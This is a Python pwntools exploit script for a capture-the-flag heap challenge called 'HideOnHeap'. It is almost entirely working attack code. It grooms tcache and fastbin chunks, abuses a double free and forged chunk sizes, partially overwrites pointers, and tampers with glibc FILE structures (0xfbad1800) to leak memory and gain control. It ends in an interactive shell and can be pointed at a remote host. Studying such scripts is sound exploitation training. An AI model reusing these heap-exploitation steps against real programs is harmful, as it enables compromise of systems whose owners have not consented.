# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './HideOnHeap'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size ):
    cmd(1)
    sla('Size:' , size)

def edit(idx , text):
    cmd(2)
    sla('Index:' , idx)
    sa('Content:' , text)

def delete(idx ):
    cmd(3)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    # list = $rebase(0x0000000000004040)
    add(0x48)
    for i in range(0x9):
        add(0x48 )
        edit(i, flat(0 , 0x51)*4)
    add(0x508)
    edit(10 ,  flat(0 , 0x51)*0x50)
    add(0x1000)

    for i in range(7):
        delete(i+1)
    
    delete(8)
    delete(9)
    delete(8)

    for i in range(7):
        add(0x48)

    add(0x48)
    add(0x48)
    edit(8 , '\x40')
    add(0x48)
    add(0x48)

    delete(10)
    add(0x48)
    add(0x4b8)

    delete(0)
    delete(10)

    edit(13 , flat(0,0,0,0x511,0,0,0,0))
    delete(10)

    add(0x508)
    edit(13 , flat(0,0,0,0x511) + p16(0x35c0))

    add(0x48)
    add(0x48)

    edit(15 , flat(0xfbad1800 , 0,0,0))
    delete(10)

    add(0x48)
    add(0x4b8)
    delete(6)
    delete(10)
    edit(13 , flat(0,0,0,0x511,0,0,0,0))
    delete(10)

    add(0x508)
    edit(13 , flat(0,0,0,0x511) + p16(0x5b80))

    add(0x48)
    add(0x48)
    add(0x48)

    edit(0 , flat(0,0x51)*0x10)
    delete(18)
    delete(14)
    edit(16 , '\xb0')
    add(0x48)
    add(0x48)


    edit(17 , '\xff'*8)
    edit(11 , flat(0,0x21)*0x100)

    edit(13 , flat(0,0,0,0x14c1,0,0,0,0))
    delete(0)
    edit(13 , flat(0,0,0,0x14d1,0,0,0,0))
    delete(0)
    edit(13 , flat(0,0,0,0x14e1,0,0,0,0))
    delete(0)

    edit(18 , flat(0,0,0,0xc1))


    edit(15 , flat(0xfbad1800 , 0,0,0)+ p16(0xb300))
    edit(17 , p64(0x80))

    add(0xf0)
        
    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   HideOnHeap.py
@Time    :   2022/02/12 10:14:59
@Author  :   Niyah 
'''